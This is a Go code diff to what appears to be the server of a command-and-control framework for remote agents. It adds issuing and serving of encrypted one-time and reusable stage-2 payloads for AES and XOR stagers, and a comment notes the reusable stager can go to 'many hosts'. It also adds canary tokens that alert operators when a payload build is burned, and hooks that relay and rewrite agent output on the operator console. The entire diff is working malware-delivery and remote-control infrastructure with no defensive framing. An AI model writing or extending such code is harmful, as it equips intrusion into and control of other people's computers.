@@ -57,6 +57,9 @@ type Server struct {
 	tlsFp     string
 
 	rcp *RCPListener // remote control long-lived channel
+
+	// stages holds one-time stage-2 payloads for the staged payload workflow.
+	stages *StageStore
 }
 
 // AgentSession holds the runtime state for a connected agent.
@@ -113,9 +116,77 @@ func New(database *db.Database, emitter EventEmitter) (*Server, error) {
 		rsaKey:    privKey,
 		rsaPubPEM: pubPEM,
 		stopCh:    make(chan struct{}),
+		stages:    newStageStore(database),
 	}
 	s.rcp = newRCPListener(s)
 	return s, nil
+}
+
+// IssueStage registers a stage-2 payload and returns the one-time token and
+// the AES key to embed in the stager.
+func (s *Server) IssueStage(payload []byte, ttl time.Duration) (string, string, error) {
+	return s.stages.Issue(payload, ttl)
+}
+
+// IssueStageXOR registers a stage-2 payload for the tiny C stager (XOR
+// encryption instead of AES-GCM) and returns the one-time token + key.
+func (s *Server) IssueStageXOR(payload []byte, ttl time.Duration) (string, string, error) {
+	return s.stages.IssueXOR(payload, ttl)
+}
+
+// IssueStagePersistent registers a reusable stage (not consumed on fetch) so
+// the same stager can be deployed to many hosts. ttl == 0 means no expiry.
+// xor selects the encryption scheme (C stager = true).
+func (s *Server) IssueStagePersistent(payload []byte, ttl time.Duration, xor bool) (string, string, error) {
+	return s.stages.IssuePersistent(payload, ttl, xor)
+}
+
+// ConsumeStage fetches a one-time stage by token.
+func (s *Server) ConsumeStage(token string) (string, string, bool) {
+	return s.stages.Consume(token)
+}
+
+// ConsumeStageRaw fetches a one-time stage by token and returns the key plus
+// the raw encrypted bytes (no base64/JSON wrapper).
+func (s *Server) ConsumeStageRaw(token string) ([]byte, []byte, bool) {
+	return s.stages.ConsumeRaw(token)
+}
+
+// RecordCanaryBurn marks a build's canary token as triggered. Returns true if
+// the token existed and was armed (a genuine burn, not a random probe). The
+// burn is surfaced to the frontend as a real-time event.
+func (s *Server) RecordCanaryBurn(token, remoteIP string) bool {
+	if s.db == nil {
+		return false
+	}
+	burned, err := s.db.BurnCanary(token, remoteIP)
+	if err != nil {
+		log.Printf("[Canary] burn query failed for %s: %v", token, err)
+		return false
+	}
+	if !burned {
+		return false
+	}
+	s.mu.Lock()
+	emitter := s.emitter
+	s.mu.Unlock()
+	if emitter != nil {
+		emitter.EmitEvent("canary:burn", map[string]any{
+			"token":     token,
+			"remote_ip": remoteIP,
+			"at":        time.Now().Format(time.RFC3339),
+		})
+	}
+	log.Printf("[Canary] BURN token=%s from %s", token, remoteIP)
+	return true
+}
+
+// IssueCanary registers a new armed canary token for a payload build.
+func (s *Server) IssueCanary(token, buildName string) error {
+	if s.db == nil {
+		return fmt.Errorf("no database")
+	}
+	return s.db.CreateCanary(token, buildName)
 }
 
 // allowConn checks whether a new connection from ip is allowed by the limiter.
@@ -416,6 +487,36 @@ func (s *Server) CompleteTask(taskID, result, status string) {
 		return
 	}
 
+	// Streaming output of an async job: relay to the console + frontend without
+	// completing the owning task. The job's final line carries status "completed".
+	if status == protocol.TaskJobOutput {
+		if task, err := s.db.GetTask(taskID); err == nil {
+			// Pre-hook: scripts may rewrite/redact the job output before it
+			// reaches the operator console.
+			hctx := TriggerHook("session:output", HookPre, map[string]any{
+				"session_id": task.SessionID,
+				"task_id":    taskID,
+				"result":     result,
+				"status":     status,
+			}, nil)
+			if !hctx.Abort {
+				if r, ok := hctx.Input["result"].(string); ok {
+					result = r
+				}
+				_ = s.db.InsertConsoleLog(task.SessionID, "output", result)
+				if s.emitter != nil {
+					s.emitter.EmitEvent("session:output", map[string]string{
+						"session_id": task.SessionID,
+						"task_id":    taskID,
+						"result":     result,
+						"status":     status,
+					})
+				}
+			}
+		}
+		return
+	}
+
 	_ = s.db.CompleteTask(taskID, result, status)
 
 	// Audit log: persist the result for the session's console history
@@ -445,6 +546,21 @@ func (s *Server) CompleteTask(taskID, result, status string) {
 		// TakeScreenshot/GetScreenshot flow instead.
 		if task.CommandID == int(protocol.CmdScreenshot) {
 			return
+		}
+
+		// Pre-hook: scripts may rewrite/redact the completed task output before
+		// it is persisted and shown.
+		hctx := TriggerHook("session:output", HookPre, map[string]any{
+			"session_id": task.SessionID,
+			"task_id":    taskID,
+			"result":     result,
+			"status":     status,
+		}, nil)
+		if hctx.Abort {
+			return
+		}
+		if r, ok := hctx.Input["result"].(string); ok {
+			result = r
 		}
 
 		// Format the status tag and the command output on separate lines so the
